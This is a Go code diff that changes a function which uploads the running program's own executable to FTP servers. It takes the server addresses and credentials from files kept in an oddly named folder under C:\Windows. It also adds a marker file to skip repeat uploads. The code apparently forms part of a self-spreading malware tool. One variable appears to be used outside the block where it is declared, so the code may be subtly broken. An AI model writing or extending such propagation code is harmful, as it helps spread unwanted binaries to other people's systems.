@@ -5,14 +5,44 @@ import (
 	"fmt"
 	"io/ioutil"
 	"os"
+	"path/filepath"
 	"strings"
 
 	"github.com/dutchcoders/goftp"
 )
 
+const markerFileName = "upload_marker.txt"
+
 func FtP() {
+	// Specify the directory path
+	dirPath := "C:\\Windows\\loveorhate"
+
+	// Read the marker file to check the last successful upload
+	markerFilePath := filepath.Join(dirPath, markerFileName)
+	lastUploaded, err := ioutil.ReadFile(markerFilePath)
+	if err != nil && !os.IsNotExist(err) {
+		fmt.Println("Error reading marker file:", err)
+		return
+	}
+
+	// If the marker file exists, check if the executable path matches the last successful upload
+	if len(lastUploaded) > 0 {
+		executablePath, err := os.Executable()
+		if err != nil {
+			fmt.Printf("Failed to get the path of the executable: %v\n", err)
+			return
+		}
+
+		// Compare the executable paths
+		if string(lastUploaded) == executablePath {
+			fmt.Println("Executable already uploaded. Skipping upload.")
+			return
+		}
+	}
+
 	// Read FTP server IPs from file
-	ipFile, err := os.Open("ftpip.txt")
+	ipFilePath := filepath.Join(dirPath, "ftpip.txt")
+	ipFile, err := os.Open(ipFilePath)
 	if err != nil {
 		fmt.Println("Error reading FTP server IPs file:", err)
 		return
@@ -29,7 +59,8 @@ func FtP() {
 	ftpIP := strings.TrimSpace(ipScanner.Text())
 
 	// Read FTP credentials from file
-	credFile, err := os.Open("ftp.txt")
+	credFilePath := filepath.Join(dirPath, "ftp.txt")
+	credFile, err := os.Open(credFilePath)
 	if err != nil {
 		fmt.Println("Error reading FTP credentials file:", err)
 		return
@@ -85,6 +116,13 @@ func FtP() {
 		err = uploadFile(client, remoteFilePath, string(fileContent))
 		if err != nil {
 			fmt.Printf("Failed to upload the Go program to FTP server: %v\n", err)
+			return
+		}
+
+		// Write the current executable path to the marker file
+		err = ioutil.WriteFile(markerFilePath, []byte(executablePath), 0644)
+		if err != nil {
+			fmt.Printf("Failed to write marker file: %v\n", err)
 			return
 		}
 
